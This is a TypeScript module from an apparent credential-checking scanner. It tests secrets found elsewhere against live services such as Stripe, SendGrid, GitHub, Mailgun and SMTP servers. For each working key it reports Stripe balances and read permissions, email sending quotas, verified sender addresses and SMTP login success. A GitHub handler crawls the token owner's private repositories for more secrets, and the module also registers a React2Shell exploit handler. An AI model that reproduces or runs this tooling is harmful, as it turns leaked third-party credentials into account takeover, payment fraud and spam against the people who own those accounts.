import type { IHttpClient, ILogger, PatternMatch, RawHit, ValidationHandler, ValidationResult } from "@scanner/core";
import { authenticateSmtp } from "./smtp-probe.js";
import {
  collectMailEnv,
  formatMailBlock,
  isFullSendGridKey,
  isStripeSecret,
  isTutorialSmtpHit,
  isUsableSmtp,
  smtpApiRoute,
  smtpBrand,
} from "./smtp-env.js";
import { AwsHandler } from "./aws-handler.js";
import { githubCardMeta, type GithubRepo, type GithubUser } from "./github-meta.js";
import { harvestGitHubRepos } from "./github-harvest.js";
import { BitbucketHandler, GitBucketHandler, GitLabHandler } from "./git-forges.js";
import { TwilioHandler } from "./twilio.js";
import {
  AzureHandler,
  ElasticEmailHandler,
  MailtrapHandler,
  MondayHandler,
  SalesforceHandler,
  ZohoHandler,
} from "./crm-handlers.js";
import { modelsMeta, parseModelIds } from "./ai-models.js";
import { aiHandlers } from "./ai-handler.js";
import { React2ShellHandler } from "./react2shell.js";

export { AwsHandler } from "./aws-handler.js";
export { AzureHandler, ElasticEmailHandler, MailtrapHandler, MondayHandler, SalesforceHandler, ZohoHandler } from "./crm-handlers.js";

function json(text: string): unknown {
  try {
    return JSON.parse(text) as unknown;
  } catch {
    return {};
  }
}

export class SendGridHandler implements ValidationHandler {
  readonly service = "sendgrid";
  constructor(private readonly http: IHttpClient) {}
  async validate(_hit: RawHit, match: PatternMatch): Promise<ValidationResult> {
    if (!isFullSendGridKey(match.value)) {
      return { service: "sendgrid", valid: false, details: "clé SendGrid incomplète (len ≠ 69)" };
    }
    const headers = { authorization: `Bearer ${match.value}` };
    try {
      const acct = await this.http.get("https://api.sendgrid.com/v3/user/account", {
        budget: "httpRequest",
        headers,
      });
      if (acct.status === 400 || acct.status === 401 || acct.status === 403 || (acct.status !== 200 && acct.status < 500)) {
        return { service: "sendgrid", valid: false, details: `HTTP ${acct.status}`, error: acct.text.slice(0, 120) };
      }
      if (acct.status !== 200) {
        return { service: "sendgrid", valid: false, raw: true, details: `HTTP ${acct.status}` };
      }
      const account = json(acct.text) as { type?: string };
      const res = await this.http.get("https://api.sendgrid.com/v3/user/credits", {
        budget: "httpRequest",
        headers,
      });
      const credits = json(res.text) as {
        used?: number;
        total?: number;
        remain?: number;
        type?: string;
      };
      const used = Number(credits.used ?? 0);
      const total = Number(credits.total ?? 0);
      const remain = Number(credits.remain ?? Math.max(0, total - used));
      const from = await this.senders(headers);
      const quota =
        res.status === 200
          ? `${used} used / ${total} total (${remain} remaining)`
          : "N/A";
      return {
        service: "sendgrid",
        valid: true,
        details: `Type: ${account.type ?? "unknown"} | Quota: ${quota}`,
        meta: {
          accountType: String(account.type ?? "unknown"),
          quota,
          from: from || "Aucun",
          smtp: "Disponible",
        },
      };
    } catch (err) {
      return { service: "sendgrid", valid: false, error: (err as Error).message, details: "request failed" };
    }
  }

  private async senders(headers: Record<string, string>): Promise<string> {
    const emails = new Set<string>();
    try {
      const res = await this.http.get("https://api.sendgrid.com/v3/verified_senders", { budget: "httpRequest", headers });
      const body = json(res.text) as { results?: Array<{ from_email?: string }> };
      for (const r of body.results ?? []) if (r.from_email) emails.add(r.from_email);
    } catch {
      /* ignore */
    }
    try {
      const res = await this.http.get("https://api.sendgrid.com/v3/user/email", { budget: "httpRequest", headers });
      const body = json(res.text) as { email?: string };
      if (body.email) emails.add(body.email);
    } catch {
      /* ignore */
    }
    return [...emails].join(", ");
  }
}

export class StripeHandler implements ValidationHandler {
  readonly service = "stripe";
  constructor(private readonly http: IHttpClient) {}
  async validate(_hit: RawHit, match: PatternMatch, siblings: PatternMatch[]): Promise<ValidationResult> {
    const secret = [match, ...siblings].find((s) => isStripeSecret(s.value))?.value ?? "";
    const pub = [match, ...siblings].find((s) => s.value.startsWith("pk_"))?.value ?? "";
    if (!secret) {
      return {
        service: "stripe",
        valid: false,
        raw: true,
        details: "pk without sk — skip",
        meta: { skipNotify: "1" },
      };
    }
    const headers = { authorization: `Bearer ${secret}` };
    try {
      const res = await this.http.get("https://api.stripe.com/v1/balance", { budget: "httpRequest", headers });
      if (res.status !== 200) {
        return { service: "stripe", valid: false, details: `HTTP ${res.status}`, error: res.text.slice(0, 120) };
      }
      const bal = json(res.text) as { available?: Array<{ amount: number; currency: string }> };
      const avail = bal.available?.[0];
      const amount = avail ? (avail.amount / 100).toFixed(2) : "0.00";
      const currency = (avail?.currency ?? "usd").toUpperCase();
      let company = "N/A";
      let country = "N/A";
      try {
        const acc = await this.http.get("https://api.stripe.com/v1/account", { budget: "httpRequest", headers });
        if (acc.status === 200) {
          const a = json(acc.text) as {
            country?: string;
            business_profile?: { name?: string };
            settings?: { dashboard?: { display_name?: string } };
          };
          country = a.country ?? "N/A";
          company = a.business_profile?.name || a.settings?.dashboard?.display_name || "N/A";
        }
      } catch {
        /* ignore */
      }
      const isTestKey = secret.startsWith("sk_test_") || secret.startsWith("rk_test_");
      const permBlock = await this.permissions(headers);
      return {
        service: "stripe",
        valid: !isTestKey,
        details: isTestKey ? "Clé de test Stripe (sk_test_)" : `balance ${amount} ${currency}`,
        meta: {
          publicKey: pub,
          company,
          country,
          balance: `${amount} ${currency}`,
          permBlock,
          ...(isTestKey ? { statusKind: "test-key", testKey: "1" } : {}),
        },
      };
    } catch (err) {
      return { service: "stripe", valid: false, details: "request failed", error: (err as Error).message };
    }
  }

  private async permissions(headers: Record<string, string>): Promise<string> {
    const probes: Array<{ name: string; path: string }> = [
      { name: "balance_read", path: "/v1/balance" },
      { name: "charges_read", path: "/v1/charges?limit=1" },
      { name: "customers_read", path: "/v1/customers?limit=1" },
      { name: "payment_intents_read", path: "/v1/payment_intents?limit=1" },
      { name: "payment_methods_read", path: "/v1/payment_methods?limit=1&type=card" },
      { name: "products_read", path: "/v1/products?limit=1" },
      { name: "prices_read", path: "/v1/prices?limit=1" },
      { name: "subscriptions_read", path: "/v1/subscriptions?limit=1" },
      { name: "invoices_read", path: "/v1/invoices?limit=1" },
      { name: "refunds_read", path: "/v1/refunds?limit=1" },
      { name: "payouts_read", path: "/v1/payouts?limit=1" },
      { name: "transfers_read", path: "/v1/transfers?limit=1" },
      { name: "checkout_sessions_read", path: "/v1/checkout/sessions?limit=1" },
      { name: "files_read", path: "/v1/files?limit=1" },
    ];
    const lines: string[] = [];
    for (const p of probes) {
      try {
        const res = await this.http.get(`https://api.stripe.com${p.path}`, { budget: "httpRequest", headers });
        if (res.status === 200) lines.push(`✅ ${p.name}`);
        else if (res.status === 403) lines.push(`❌ ${p.name}`);
        else if (res.status === 401) break;
        else lines.push(`⚠️ ${p.name} (HTTP ${res.status})`);
      } catch {
        lines.push(`⚠️ ${p.name} (erreur)`);
      }
    }
    return lines.join("\n");
  }
}

function githubAuthHeaders(token: string, scheme: "Bearer" | "token"): Record<string, string> {
  return {
    authorization: `${scheme} ${token}`,
    accept: "application/vnd.github.v3+json",
    "x-github-api-version": "2022-11-28",
    "user-agent": "DreksScanner",
  };
}

function parseGithubUser(text: string): GithubUser {
  const parsed = json(text) as GithubUser;
  if (parsed.login?.trim()) return parsed;
  const login = text.match(/"login"\s*:\s*"([^"]+)"/)?.[1];
  if (login) return { ...parsed, login };
  return parsed;
}

export class GitHubHandler implements ValidationHandler {
  readonly service = "github";
  constructor(private readonly http: IHttpClient) {}
  async validate(hit: RawHit, match: PatternMatch): Promise<ValidationResult> {
    const token = match.value.trim();
    let last = "request failed";
    for (const scheme of ["Bearer", "token"] as const) {
      const tried = await this.probe(token, scheme, hit);
      if (tried) return tried;
      last = `HTTP with ${scheme}`;
    }
    return { service: "github", valid: false, details: last };
  }

  private async probe(token: string, scheme: "Bearer" | "token", hit: RawHit): Promise<ValidationResult | null> {
    const headers = githubAuthHeaders(token, scheme);
    try {
      const res = await this.http.get("https://api.github.com/user", { budget: "httpRequest", headers });
      if (res.status === 401 || res.status === 403) return null;
      if (res.status !== 200) {
        return { service: "github", valid: false, details: `HTTP ${res.status}`, error: res.text.slice(0, 120) };
      }
      const user = parseGithubUser(res.text);
      const scopes = (res.headers["x-oauth-scopes"] || res.headers["x-accepted-oauth-scopes"] || "").trim() || "N/A";
      const repos = await this.listRepos(headers);
      if (!user.login?.trim()) {
        const viewer = await this.viewer(headers);
        if (viewer.login) {
          user.login = viewer.login;
          user.name = user.name || viewer.name;
          user.email = user.email || viewer.email;
        }
      }
      const meta = githubCardMeta(user, scopes === "N/A" ? "" : scopes, repos);
      const harvested = /^(gh|gl|bb)-harvest:/.test(hit.path ?? "")
        ? []
        : await harvestGitHubRepos(this.http, headers, repos);
      meta.crawled = String(repos.length);
      return {
        service: "github",
        valid: true,
        details: meta.identity === "?" ? "user (profil limité)" : `user ${meta.identity}`,
        meta,
        harvested,
      };
    } catch {
      return null;
    }
  }

  private async listRepos(headers: Record<string, string>): Promise<GithubRepo[]> {
    const rest = await this.listReposRest(headers);
    if (rest.length) return rest;
    const install = await this.listInstallRepos(headers);
    if (install.length) return install;
    return this.listReposGraphql(headers);
  }

  private async listReposRest(headers: Record<string, string>): Promise<GithubRepo[]> {
    try {
      const listed = await this.http.get(
        "https://api.github.com/user/repos?per_page=100&sort=updated&affiliation=owner,collaborator,organization_member",
        { budget: "httpRequest", headers },
      );
      if (listed.status !== 200) return [];
      const parsed = json(listed.text);
      const repos = Array.isArray(parsed) ? (parsed as GithubRepo[]) : [];
      return [...repos].sort((a, b) => Number(b.private) - Number(a.private));
    } catch {
      return [];
    }
  }

  private async listInstallRepos(headers: Record<string, string>): Promise<GithubRepo[]> {
    try {
      const listed = await this.http.get("https://api.github.com/installation/repositories?per_page=100", {
        budget: "httpRequest",
        headers,
      });
      if (listed.status !== 200) return [];
      const body = json(listed.text) as { repositories?: GithubRepo[] };
      const repos = Array.isArray(body.repositories) ? body.repositories : [];
      return [...repos].sort((a, b) => Number(b.private) - Number(a.private));
    } catch {
      return [];
    }
  }

  private async listReposGraphql(headers: Record<string, string>): Promise<GithubRepo[]> {
    try {
      const res = await this.http.post("https://api.github.com/graphql", {
        budget: "httpRequest",
        headers,
        body: JSON.stringify({
          query:
            "query { viewer { repositories(first: 50, affiliations: [OWNER, COLLABORATOR, ORGANIZATION_MEMBER], orderBy: {field: UPDATED_AT, direction: DESC}) { nodes { nameWithOwner isPrivate owner { login } } } } }",
        }),
      });
      if (res.status !== 200) return [];
      const body = json(res.text) as {
        data?: {
          viewer?: {
            repositories?: { nodes?: Array<{ nameWithOwner?: string; isPrivate?: boolean; owner?: { login?: string } }> };
          };
        };
      };
      const nodes = body.data?.viewer?.repositories?.nodes ?? [];
      return nodes
        .filter((n) => n.nameWithOwner)
        .map((n) => ({
          full_name: n.nameWithOwner,
          name: n.nameWithOwner?.split("/")[1],
          private: n.isPrivate,
          owner: n.owner,
        }));
    } catch {
      return [];
    }
  }

  private async viewer(headers: Record<string, string>): Promise<GithubUser> {
    try {
      const res = await this.http.post("https://api.github.com/graphql", {
        budget: "httpRequest",
        headers,
        body: JSON.stringify({ query: "query { viewer { login name email } }" }),
      });
      if (res.status !== 200) return {};
      const body = json(res.text) as { data?: { viewer?: GithubUser } };
      return body.data?.viewer ?? {};
    } catch {
      return {};
    }
  }
}

export class BrevoHandler implements ValidationHandler {
  readonly service = "brevo";
  constructor(private readonly http: IHttpClient) {}
  async validate(_hit: RawHit, match: PatternMatch): Promise<ValidationResult> {
    const headers = { "api-key": match.value };
    try {
      const res = await this.http.get("https://api.brevo.com/v3/account", { budget: "httpRequest", headers });
      if (res.status === 401 || res.status === 403) {
        return { service: "brevo", valid: false, details: `HTTP ${res.status}`, error: res.text.slice(0, 120) };
      }
      if (res.status !== 200) {
        return { service: "brevo", valid: false, raw: true, details: `HTTP ${res.status}` };
      }
      const acct = json(res.text) as {
        companyName?: string;
        email?: string;
        plan?: Array<{ credits?: number; creditsType?: string; type?: string }>;
      };
      const company = acct.companyName?.trim() || "N/A";
      const email = acct.email?.trim() || "N/A";
      const plan = acct.plan?.[0];
      const credits = Number(plan?.credits ?? 0);
      const creditsType = plan?.creditsType || plan?.type || "N/A";
      const today = new Date().toISOString().slice(0, 10);
      let sentToday = "0";
      try {
        const stats = await this.http.get(
          `https://api.brevo.com/v3/smtp/statistics/aggregatedReport?startDate=${today}&endDate=${today}`,
          { budget: "httpRequest", headers },
        );
        if (stats.status === 200) {
          const s = json(stats.text) as { requests?: number };
          sentToday = String(s.requests ?? 0);
        }
      } catch {
        /* ignore */
      }
      let from = "Aucun";
      try {
        const senders = await this.http.get("https://api.brevo.com/v3/senders", { budget: "httpRequest", headers });
        if (senders.status === 200) {
          const body = json(senders.text) as { senders?: Array<{ email?: string; active?: boolean }> };
          const emails = (body.senders ?? []).map((s) => s.email).filter((e): e is string => !!e);
          if (emails.length) from = emails.slice(0, 8).join(", ");
        }
      } catch {
        /* ignore */
      }
      return {
        service: "brevo",
        valid: true,
        details: `Société: ${company} | Crédits: ${credits}`,
        meta: {
          company,
          email,
          credits: `${credits} (${creditsType})`,
          sentToday,
          from,
        },
      };
    } catch (err) {
      return { service: "brevo", valid: false, details: "request failed", error: (err as Error).message };
    }
  }
}

export class MailgunHandler implements ValidationHandler {
  readonly service: string = "mailgun";
  constructor(private readonly http: IHttpClient) {}
  async validate(_hit: RawHit, match: PatternMatch): Promise<ValidationResult> {
    const token = Buffer.from(`api:${match.value}`).toString("base64");
    const headers = { authorization: `Basic ${token}` };
    const regions: Array<{ name: "US" | "EU"; url: string }> = [
      { name: "US", url: "https://api.mailgun.net/v3/domains" },
      { name: "EU", url: "https://api.eu.mailgun.net/v3/domains" },
    ];
    let lastStatus = 0;
    let lastErr = "";
    for (const region of regions) {
      try {
        const res = await this.http.get(region.url, { budget: "httpRequest", headers });
        lastStatus = res.status;
        if (res.status === 401 || res.status === 403) {
          lastErr = res.text.slice(0, 120);
          continue;
        }
        if (res.status !== 200) {
          lastErr = res.text.slice(0, 120);
          continue;
        }
        const body = json(res.text) as {
          total_count?: number;
          items?: Array<{ name?: string; state?: string; smtp_login?: string; type?: string }>;
        };
        const items = body.items ?? [];
        const names = items.map((d) => d.name).filter((n): n is string => !!n);
        const froms = items.map((d) => d.smtp_login).filter((n): n is string => !!n);
        const states = items
          .filter((d) => d.name)
          .map((d) => `${d.name}${d.state ? ` (${d.state})` : ""}`);
        const total = body.total_count ?? names.length;
        let sent = "N/A";
        try {
          const stats = await this.http.get(`${new URL(region.url).origin}/v3/stats/total?event=accepted&duration=1m`, {
            budget: "httpRequest",
            headers,
          });
          if (stats.status === 200) {
            const st = json(stats.text) as { stats?: Array<{ accepted?: { total?: number } }> };
            const n = st.stats?.reduce((acc, x) => acc + Number(x.accepted?.total ?? 0), 0);
            if (n != null) sent = String(n);
          }
        } catch {
          /* ignore */
        }
        return {
          service: this.service,
          valid: true,
          details: `${region.name} ${total} domain(s)`,
          meta: {
            region: region.name,
            domainCount: String(total),
            domains: states.slice(0, 8).join(", ") || "Aucun",
            from: froms.slice(0, 8).join(", ") || "Aucun",
            quota: sent,
          },
        };
      } catch (err) {
        lastErr = (err as Error).message;
      }
    }
    if (lastStatus === 401 || lastStatus === 403) {
      return { service: this.service, valid: false, details: `HTTP ${lastStatus}`, error: lastErr };
    }
    return { service: this.service, valid: false, details: lastStatus ? `HTTP ${lastStatus}` : "request failed", error: lastErr };
  }
}

export class NewMailgunHandler extends MailgunHandler {
  override readonly service = "newmailgun";
}

export class SmtpHandler implements ValidationHandler {
  readonly service: string;
  constructor(
    service = "smtp",
    private readonly authTimeoutMs = 10_000,
  ) {
    this.service = service;
  }
  async validate(hit: RawHit, match: PatternMatch, siblings: PatternMatch[]): Promise<ValidationResult> {
    const env = collectMailEnv(hit, match, siblings);
    const routed = smtpApiRoute(env);
    if (routed) {
      return {
        service: this.service,
        valid: false,
        details: `routé ${routed}`,
        meta: { skipNotify: "1", envBlock: formatMailBlock(env) },
      };
    }
    const host = env.MAIL_HOST;
    if (isTutorialSmtpHit(hit) || !isUsableSmtp(env) || !host) {
      return {
        service: "smtp",
        valid: false,
        raw: true,
        details: "SMTP incomplet / placeholder — skip",
        meta: { skipNotify: "1", envBlock: formatMailBlock(env) },
      };
    }
    const port = Number(env.MAIL_PORT || 587);
    const auth = await authenticateSmtp({
      host,
      user: env.MAIL_USERNAME,
      pass: env.MAIL_PASSWORD,
      preferredPort: port,
      encryption: env.MAIL_ENCRYPTION,
      timeoutMs: this.authTimeoutMs,
    });
    const block = formatMailBlock(env);
    const brand = smtpBrand(host);
    if (auth.ok) {
      return {
        service: this.service,
        valid: true,
        details: `AUTH OK port ${auth.port}`,
        meta: {
          envBlock: block,
          smtpBrand: brand,
          portWarn: `✅ AUTH OK (port ${auth.port})`,
        },
      };
    }
    if (auth.kind === "auth") {
      return {
        service: this.service,
        valid: false,
        details: `AUTH rejeté port ${auth.port}`,
        error: auth.reply,
        meta: {
          envBlock: block,
          smtpBrand: brand,
          portWarn: `❌ AUTH rejeté (port ${auth.port})`,
        },
      };
    }
    if (auth.errors.some((e) => /ENOTFOUND|EAI_AGAIN|getaddrinfo/i.test(e))) {
      return {
        service: this.service,
        valid: false,
        raw: true,
        details: "host DNS inexistant — skip",
        meta: { skipNotify: "1", envBlock: block },
      };
    }
    return {
      service: this.service,
      valid: false,
      raw: true,
      details: "ports injoignables",
      meta: {
        statusKind: "unverified-network",
        envBlock: block,
        smtpBrand: brand,
        portWarn: `⚠️ Ports injoignables (firewall?) — AUTH non testé`,
        dialError: `📵 ${auth.errors[auth.errors.length - 1] ?? "i/o timeout"}`,
      },
    };
  }
}

export class KlaviyoHandler implements ValidationHandler {
  readonly service = "klaviyo";
  constructor(private readonly http: IHttpClient) {}

  async validate(_hit: RawHit, match: PatternMatch): Promise<ValidationResult> {
    const headers = {
      authorization: `Klaviyo-API-Key ${match.value}`,
      revision: "2024-10-15",
      accept: "application/vnd.api+json",
    };
    try {
      const acc = await this.http.get(
        "https://a.klaviyo.com/api/accounts/?additional-fields%5Baccount%5D=contact_information",
        { budget: "httpRequest", headers },
      );
      if (acc.status === 401 || acc.status === 403) {
        return { service: "klaviyo", valid: false, details: `HTTP ${acc.status}`, error: acc.text.slice(0, 120) };
      }
      if (acc.status !== 200) {
        return { service: "klaviyo", valid: false, raw: true, details: `HTTP ${acc.status}` };
      }
      const body = json(acc.text) as {
        data?: Array<{
          attributes?: {
            contact_information?: { organization_name?: string; default_sender_email?: string };
            timezone?: string;
            preferred_currency?: string;
          };
        }>;
      };
      const attrs = body.data?.[0]?.attributes ?? {};
      const org = attrs.contact_information?.organization_name?.trim() || "N/A";
      const tz = attrs.timezone?.trim() || "N/A";
      const currency = attrs.preferred_currency?.trim() || "N/A";
      const from = attrs.contact_information?.default_sender_email?.trim() || "Non détecté";

      const lists = await this.collection(headers, "https://a.klaviyo.com/api/lists/?page%5Bsize%5D=20");
      const flows = await this.collection(headers, "https://a.klaviyo.com/api/flows/?page%5Bsize%5D=20");
      const shown = lists.names.slice(0, 5);
      const extra = Math.max(0, lists.total - shown.length);
      const listsBlock = [
        ...shown.map((n) => `  • ${n}`),
        extra > 0 ? `  ... et ${extra} autre(s) liste(s)` : "",
      ]
        .filter(Boolean)
        .join("\n");

      return {
        service: "klaviyo",
        valid: true,
        details: `org ${org} lists ${lists.total}`,
        meta: {
          org,
          timezone: tz,
          currency,
          fromEmails: from,
          flowCount: String(flows.total),
          listCount: String(lists.total),
          listsBlock,
        },
      };
    } catch (err) {
      return { service: "klaviyo", valid: false, details: "request failed", error: (err as Error).message };
    }
  }

  private async collection(
    headers: Record<string, string>,
    url: string,
  ): Promise<{ names: string[]; total: number }> {
    try {
      const res = await this.http.get(url, { budget: "httpRequest", headers });
      if (res.status !== 200) return { names: [], total: 0 };
      const body = json(res.text) as {
        data?: Array<{ attributes?: { name?: string } }>;
        links?: { next?: string | null };
      };
      const names = (body.data ?? []).map((d) => d.attributes?.name).filter((n): n is string => !!n);
      let total = names.length;
      if (body.links?.next) total = Math.max(total, names.length + 1);
      return { names, total };
    } catch {
      return { names: [], total: 0 };
    }
  }
}

export class MandrillHandler implements ValidationHandler {
  readonly service = "mandrill";
  constructor(private readonly http: IHttpClient) {}
  async validate(_hit: RawHit, match: PatternMatch): Promise<ValidationResult> {
    const body = JSON.stringify({ key: match.value });
    try {
      const res = await this.http.post("https://mandrillapp.com/api/1.0/users/info.json", {
        budget: "httpRequest",
        headers: { "content-type": "application/json" },
        body,
      });
      if (res.status === 200) {
        const info = json(res.text) as {
          username?: string;
          reputation?: number;
          hourly_quota?: number;
          stats?: { today?: { sent?: number }; all_time?: { sent?: number } };
        };
        return {
          service: "mandrill",
          valid: true,
          details: `User: ${info.username ?? "N/A"} | Quota: ${info.hourly_quota ?? 0}/hr`,
          meta: {
            username: String(info.username ?? "N/A"),
            quota: `${info.hourly_quota ?? 0} emails/hr`,
            reputation: String(info.reputation ?? 0),
            sentToday: String(info.stats?.today?.sent ?? 0),
            sentAll: String(info.stats?.all_time?.sent ?? 0),
          },
        };
      }
      const ping = await this.http.post("https://mandrillapp.com/api/1.0/users/ping.json", {
        budget: "httpRequest",
        headers: { "content-type": "application/json" },
        body,
      });
      if (ping.status === 200 && ping.text.includes("PONG")) {
        return { service: "mandrill", valid: true, details: "Ping PONG", meta: { username: "N/A", quota: "N/A" } };
      }
      if (res.status === 401 || ping.status === 401) {
        return { service: "mandrill", valid: false, details: `HTTP ${res.status}` };
      }
      return { service: "mandrill", valid: false, raw: true, details: `HTTP ${res.status}` };
    } catch (err) {
      return { service: "mandrill", valid: false, raw: true, details: "request failed", error: (err as Error).message };
    }
  }
}

export class PostmarkHandler implements ValidationHandler {
  readonly service = "postmark";
  constructor(private readonly http: IHttpClient) {}
  async validate(_hit: RawHit, match: PatternMatch): Promise<ValidationResult> {
    try {
      const res = await this.http.get("https://api.postmarkapp.com/server", {
        budget: "httpRequest",
        headers: { "x-postmark-server-token": match.value, accept: "application/json" },
      });
      if (res.status !== 200) {
        return { service: "postmark", valid: false, details: `HTTP ${res.status}` };
      }
      const srv = json(res.text) as { Name?: string; InboundAddress?: string; SmtpApiActivated?: boolean };
      return {
        service: "postmark",
        valid: true,
        details: `Server: ${srv.Name ?? "N/A"}`,
        meta: {
          server: srv.Name ?? "N/A",
          from: srv.InboundAddress ?? "N/A",
          smtp: srv.SmtpApiActivated ? "Disponible" : "N/A",
        },
      };
    } catch (err) {
      return { service: "postmark", valid: false, details: "request failed", error: (err as Error).message };
    }
  }
}

export class SparkpostHandler implements ValidationHandler {
  readonly service = "sparkpost";
  constructor(private readonly http: IHttpClient) {}
  async validate(_hit: RawHit, match: PatternMatch): Promise<ValidationResult> {
    const headers = { authorization: match.value };
    try {
      const res = await this.http.get("https://api.sparkpost.com/api/v1/account", { budget: "httpRequest", headers });
      if (res.status !== 200) return { service: "sparkpost", valid: false, details: `HTTP ${res.status}` };
      const body = json(res.text) as {
        results?: { company_name?: string; status?: string; subscription?: { plan?: string } };
      };
      const company = body.results?.company_name ?? "N/A";
      let from = "Aucun";
      try {
        const domains = await this.http.get("https://api.sparkpost.com/api/v1/sending-domains", {
          budget: "httpRequest",
          headers,
        });
        if (domains.status === 200) {
          const d = json(domains.text) as { results?: Array<{ domain?: string; status?: { ownership_verified?: boolean } }> };
          const names = (d.results ?? []).map((x) => x.domain).filter((n): n is string => !!n);
          if (names.length) from = names.slice(0, 8).join(", ");
        }
      } catch {
        /* ignore */
      }
      return {
        service: "sparkpost",
        valid: true,
        details: `Company: ${company}`,
        meta: { company, from, plan: body.results?.subscription?.plan ?? "N/A" },
      };
    } catch (err) {
      return { service: "sparkpost", valid: false, details: "request failed", error: (err as Error).message };
    }
  }
}

export class ResendHandler implements ValidationHandler {
  readonly service = "resend";
  constructor(private readonly http: IHttpClient) {}
  async validate(_hit: RawHit, match: PatternMatch): Promise<ValidationResult> {
    const headers = { authorization: `Bearer ${match.value}` };
    try {
      const res = await this.http.get("https://api.resend.com/domains", { budget: "httpRequest", headers });
      if (res.status !== 200) return { service: "resend", valid: false, details: `HTTP ${res.status}` };
      const body = json(res.text) as { data?: Array<{ name?: string; status?: string; region?: string }> };
      const items = body.data ?? [];
      const names = items.map((d) => d.name).filter((n): n is string => !!n);
      return {
        service: "resend",
        valid: true,
        details: `${names.length} domain(s)`,
        meta: {
          domains: names.join(", ") || "Aucun",
          from: names.slice(0, 8).join(", ") || "Aucun",
          region: items[0]?.region ?? "N/A",
        },
      };
    } catch (err) {
      return { service: "resend", valid: false, details: "request failed", error: (err as Error).message };
    }
  }
}

export class MailersendHandler implements ValidationHandler {
  readonly service = "mailersend";
  constructor(private readonly http: IHttpClient) {}
  async validate(_hit: RawHit, match: PatternMatch): Promise<ValidationResult> {
    const headers = { authorization: `Bearer ${match.value}` };
    try {
      const res = await this.http.get("https://api.mailersend.com/v1/domains", { budget: "httpRequest", headers });
      if (res.status !== 200) return { service: "mailersend", valid: false, details: `HTTP ${res.status}` };
      const body = json(res.text) as {
        data?: Array<{ name?: string; domain_settings?: { from?: { email?: string } } }>;
      };
      const items = body.data ?? [];
      const names = items.map((d) => d.name).filter((n): n is string => !!n);
      const froms = items.map((d) => d.domain_settings?.from?.email).filter((n): n is string => !!n);
      return {
        service: "mailersend",
        valid: true,
        details: `${names.length} domain(s)`,
        meta: {
          domains: names.join(", ") || "Aucun",
          from: froms.join(", ") || names[0] || "Aucun",
        },
      };
    } catch (err) {
      return { service: "mailersend", valid: false, details: "request failed", error: (err as Error).message };
    }
  }
}

export class HttpCheckHandler implements ValidationHandler {
  constructor(
    private readonly http: IHttpClient,
    readonly service: string,
    private readonly spec: (key: string) => { url: string; headers?: Record<string, string> } | null,
  ) {}

  async validate(_hit: RawHit, match: PatternMatch, siblings: PatternMatch[]): Promise<ValidationResult> {
    const key =
      this.service === "openai"
        ? (siblings.find((s) => s.value.startsWith("sk-"))?.value ?? match.value)
        : this.service === "replicate"
          ? replicateToken(match.value)
          : match.value;
    const req = this.spec(key);
    if (!req) {
      return { service: this.service, valid: false, raw: true, details: "clé incomplète / format non testable" };
    }
    try {
      const res = await this.http.get(req.url, { budget: "httpRequest", headers: req.headers });
      if (res.status === 401 || res.status === 403) {
        return { service: this.service, valid: false, details: `HTTP ${res.status}`, error: res.text.slice(0, 120) };
      }
      if (res.status === 200 || res.status === 201) {
        if (this.service === "replicate") {
          const acc = json(res.text) as { username?: string; name?: string; type?: string };
          const identity = acc.username || acc.name || "";
          return {
            service: this.service,
            valid: true,
            details: identity ? `compte ${identity}` : "account ok",
            meta: {
              identity,
              accountType: acc.type ?? "",
            },
          };
        }
        if (/\/models(?:\?|$)/i.test(req.url)) {
          const ids = parseModelIds(res.text);
          return {
            service: this.service,
            valid: true,
            details: `${ids.length} modèle(s)`,
            meta: modelsMeta(ids),
          };
        }
        return { service: this.service, valid: true, details: res.text.slice(0, 180) };
      }
      return { service: this.service, valid: false, raw: true, details: `HTTP ${res.status}` };
    } catch (err) {
      return { service: this.service, valid: false, details: "request failed", error: (err as Error).message };
    }
  }
}

function replicateToken(raw: string): string {
  const key = String(raw ?? "").trim().replace(/^["']|["']$/g, "");
  if (key.startsWith("r8_") && key.length > 40) return key.slice(0, 40);
  return key;
}

export class RawHandler implements ValidationHandler {
  constructor(readonly service: string) {}
  async validate(): Promise<ValidationResult> {
    return { service: this.service, valid: false, raw: true, details: "pas de validateur — skip", meta: { skipNotify: "1" } };
  }
}

export function builtinHandlers(http: IHttpClient, smtpAuthMs = 10_000, logger?: ILogger): ValidationHandler[] {
  return [
    new AwsHandler(http),
    new SendGridHandler(http),
    new StripeHandler(http),
    new GitHubHandler(http),
    new GitLabHandler(http),
    new BitbucketHandler(http),
    new GitBucketHandler(http),
    new BrevoHandler(http),
    new MailgunHandler(http),
    new NewMailgunHandler(http),
    new SmtpHandler("smtp", smtpAuthMs),
    new SmtpHandler("xsmtp", smtpAuthMs),
    new SmtpHandler("emailsmtp", smtpAuthMs),
    new ZohoHandler(http),
    new SalesforceHandler(http),
    new AzureHandler(http),
    new MondayHandler(http),
    new MailtrapHandler(http),
    new ElasticEmailHandler(http),
    new KlaviyoHandler(http),
    new MandrillHandler(http),
    new PostmarkHandler(http),
    new SparkpostHandler(http),
    new ResendHandler(http),
    new MailersendHandler(http),
    ...aiHandlers(http),
    new HttpCheckHandler(http, "hubspot", (key) => ({
      url: "https://api.hubapi.com/integrations/v1/me",
      headers: { authorization: `Bearer ${key}` },
    })),
    new HttpCheckHandler(http, "clickup", (key) => ({
      url: "https://api.clickup.com/api/v2/user",
      headers: { authorization: key },
    })),
    new HttpCheckHandler(http, "pipedrive", (key) => ({
      url: `https://api.pipedrive.com/v1/users/me?api_token=${encodeURIComponent(key)}`,
    })),
    new HttpCheckHandler(http, "close", (key) => ({
      url: "https://api.close.com/api/v1/me/",
      headers: { authorization: `Basic ${Buffer.from(`${key}:`).toString("base64")}` },
    })),
    new TwilioHandler(http),
    new React2ShellHandler(http, logger),
    new RawHandler("tencent"),
    new RawHandler("aliyun"),
    new RawHandler("socketlabs"),
    new RawHandler("zendesk"),
    new RawHandler("activecampaign"),
    new RawHandler("customerio"),
    new RawHandler("freshsales"),
    new RawHandler("highlevel"),
    new RawHandler("suitecrm"),
  ];
}
